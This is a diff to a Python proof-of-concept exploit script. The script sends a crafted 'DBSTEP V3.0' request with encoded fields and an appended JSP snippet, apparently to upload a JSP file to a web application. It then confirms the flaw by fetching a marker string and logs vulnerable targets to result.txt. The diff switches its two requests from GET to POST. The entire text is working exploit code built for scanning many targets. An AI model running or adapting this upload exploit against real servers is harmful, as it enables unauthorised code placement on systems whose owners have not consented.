@@ -41,8 +41,8 @@ def poc(target):
     }
     data = 'DBSTEP V3.0     351             0               666             DBSTEP=REJTVEVQ\r\nOPTION=U0FWRUZJTEU=\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nFILETYPE=Li5cNjYuanNw\r\nRECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n\r\n<%out.println("jqjjqj");%>'
     try:
-        res1 = requests.get(url=target+payload1,headers=headers,data=data,verify=False,timeout=10)
-        res2 = requests.get(url=target+payload2,headers=headers,data=data,verify=False,timeout=10)
+        res1 = requests.post(url=target+payload1,headers=headers,data=data,verify=False,timeout=10)
+        res2 = requests.post(url=target+payload2,headers=headers,data=data,verify=False,timeout=10)
         if res1.status_code == 200 and 'jqjjqj' in res2.text:
             print(f'[+]存在漏洞：{target}')
             with open('result.txt','a',encoding='utf-8') as fp:
